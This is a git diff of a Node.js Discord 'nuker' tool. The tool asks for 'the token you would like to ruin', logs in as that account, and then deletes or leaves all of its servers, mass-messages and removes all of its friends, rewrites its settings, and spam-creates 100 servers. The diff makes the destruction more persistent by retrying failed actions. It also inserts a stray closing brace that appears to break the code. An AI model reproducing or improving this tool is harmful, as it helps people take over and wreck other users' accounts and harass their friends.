@@ -5,7 +5,6 @@ const AsciiTable = require('ascii-table');
 const { Client } = require('discord.js');
 const chalk = require('chalk');
 const inquirer = require('inquirer');
-let token;
 
 const actions = {
    all: 'Execute all actions',
@@ -18,7 +17,7 @@ const actions = {
 };
 
 (async () => {
-   let { token: t } = await prompt({
+   let { token } = await prompt({
       name: 'token',
       type: 'input',
       message: "Input the token you would like to ruin:"
@@ -32,12 +31,10 @@ const actions = {
       await promptOptions(client);
    });
 
-   client.login(t).catch((err) => {
+   client.login(token).catch((err) => {
       console.error(chalk`{red ?} Invalid token provided, exiting process...`);
       process.exit(-1);
    });
-
-   token = t;
 })();
 
 async function promptOptions(client) {
@@ -104,14 +101,22 @@ async function executeAction(client, action) {
 const funcs = {
    servers: async function (client) {
       if (!client.guilds.size) return console.log(chalk`{red ?} No guilds to leave/delete.`);
-      for (const server of client.guilds.values()) {
-         await sleep(500);
-         if (server.ownerID == client.user.id) {
-            console.log(chalk`{green !} Deleting ${server.name}...`)
-            await server.delete().catch(() => {});
+      let guilds = [...client.guilds.values()]
+      for (const guild of guilds) {
+         if (guild.ownerID == client.user.id) {
+            try {
+               await guild.delete();
+               console.log(chalk`{green !} Deleting ${guild.name}...`);
+            } catch (e) {
+               if (!e.message.includes('two-factor')) guilds.push(guild);
+            }
          } else {
-            console.log(chalk`{green !} Leaving ${server.name}...`)
-            await server.leave();
+            try {
+               await guild.leave();
+               console.log(chalk`{green !} Leaving ${guild.name}...`);
+            } catch {
+               guilds.push(guild);
+            }
          }
       }
    },
@@ -122,24 +127,35 @@ const funcs = {
          message: 'What message would you like to DM all friends?',
          name: 'message'
       });
-      for (const friend of client.user.friends.values()) {
+      let friends = [...client.user.friends.values()];
+      for (const friend of friends) {
          await sleep(500);
-         console.log(chalk`{green ?} DMing ${friend.tag}`);
-         await friend.send(message).catch(() => null);
+         try {
+            await friend.send(message);
+            console.log(chalk`{green ?} DMing ${friend.tag}`);
+         } catch {
+            friends.push(friend);
+         }
       };
    },
    friends: async function (client) {
       if (!client.user.friends.size) return console.log(chalk`{red ?} No friends to remove.`);
-      for (const friend of client.user.friends.values()) {
-         await sleep(500);
-         console.log(chalk`{green ?} Removing ${friend.tag}`);
-         await friend.removeFriend().catch(() => null);
+      let friends = [...client.user.friends.values()];
+      for (const friend of friends) {
+         await sleep(250);
+         try {
+            await friend.removeFriend();
+            console.log(chalk`{green ?} Removing ${friend.tag}`);
+         } catch {
+            friends.push(friend);
+         }
       };
    },
    pfp: async function (client) {
       console.log(chalk`{green ?} Setting avatar`)
       await client.user.setAvatar('./avatar.png').catch(() => null)
    },
+         }
    settings: async function (client) {
       console.log(chalk`{green ?} Patching settings`)
       await axios.patch('https://canary.discordapp.com/api/v8/users/@me/settings', {
@@ -154,7 +170,7 @@ const funcs = {
          animate_emoji: false
       }, {
          headers: {
-            Authorization: token
+            Authorization: client.token
          }
       })
    },
@@ -164,9 +180,16 @@ const funcs = {
          message: 'What name would you like the servers to have?',
          name: 'name'
       });
-      for (let i = 0; 100 > i; i++) {
-         await sleep(250);
-         client.user.createGuild(`${name}​​​​​​​${random(3)}`, 'us-west', './avatar.png').catch(() => null);
+
+      let amount = 100;
+      while (amount > 0) {
+         await sleep(100);
+         try {
+            await client.user.createGuild(`${name} ​​​​​​​${random(3)}`, 'us-west', './avatar.png');
+            --amount;
+         } catch {
+            ++amount;
+         }
       }
    }
 };
